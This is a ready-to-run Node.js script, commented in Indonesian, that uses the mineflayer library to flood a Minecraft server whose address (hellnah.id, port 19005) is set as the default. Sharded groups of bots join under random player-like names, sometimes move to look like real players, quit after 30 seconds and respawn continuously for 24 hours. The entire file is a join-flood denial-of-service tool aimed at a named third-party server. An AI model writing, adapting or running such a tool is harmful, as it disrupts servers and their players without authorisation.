// botflood.js — join-kick loop bot
// node botflood.js

const mineflayer = require('mineflayer');

const CONFIG = {
  host: process.env.HOST || 'hellnah.id',
  port: parseInt(process.env.PORT || '19005'),
  version: process.env.VERSION || '1.21.4',
  shard: parseInt(process.env.SHARD || '0'),
  botsPerShard: parseInt(process.env.BOTS || '17'),
  duration: parseInt(process.env.DURATION || '86400'),  // 24 jam
  joinTimeout: 30000,        // 30s max online per bot
  restartDelay: 1000,        // delay sebelum bot respawn
};

console.log(`[shard ${CONFIG.shard}] start: ${CONFIG.botsPerShard} bots`);
console.log(`[shard ${CONFIG.shard}] target: ${CONFIG.host}:${CONFIG.port}`);
console.log(`[shard ${CONFIG.shard}] duration: ${CONFIG.duration}s`);

const END_TIME = Date.now() + CONFIG.duration * 1000;

function randomName() {
  const prefixes = ['Player', 'Gamer', 'Noob', 'Pro', 'User', 'MC', 'Craft', 'Sword'];
  const suffix = Math.floor(Math.random() * 99999);
  return `${prefixes[Math.floor(Math.random() * prefixes.length)]}${suffix}`;
}

function spawnBot(botId) {
  if (Date.now() > END_TIME) return;

  const name = randomName();
  const bot = mineflayer.createBot({
    host: CONFIG.host,
    port: CONFIG.port,
    username: name,
    version: CONFIG.version,
    auth: 'offline',
    hideErrors: true,
    checkTimeoutInterval: 60000,
  });

  let exited = false;

  const cleanup = (reason) => {
    if (exited) return;
    exited = true;
    try { bot.quit('cycle'); } catch (e) {}
    setTimeout(() => {
      if (Date.now() < END_TIME) spawnBot(botId);
    }, CONFIG.restartDelay);
  };

  // kalo online lama — kick sendiri
  const kickTimer = setTimeout(() => cleanup('timeout'), CONFIG.joinTimeout);

  bot.on('spawn', () => {
    console.log(`[shard ${CONFIG.shard}] [bot ${botId}] ${name} joined`);
    // kadang gerak dikit biar keliatan aktif
    if (Math.random() < 0.5) {
      try { bot.setControlState('forward', true); } catch (e) {}
    }
  });

  bot.on('error', () => cleanup('error'));
  bot.on('kicked', () => cleanup('kicked'));
  bot.on('end', () => { clearTimeout(kickTimer); cleanup('end'); });

  // safety: kalo 60s ga spawn juga — restart
  setTimeout(() => {
    if (!bot.entity) cleanup('no-spawn');
  }, 60000);
}

// spawn semua bot dengan delay biar ga barengan
for (let i = 0; i < CONFIG.botsPerShard; i++) {
  setTimeout(() => spawnBot(i), i * 2000);  // 2s jeda per bot
}

// handle SIGTERM
process.on('SIGTERM', () => {
  console.log('[shard] SIGTERM, exit');
  process.exit(0);
});
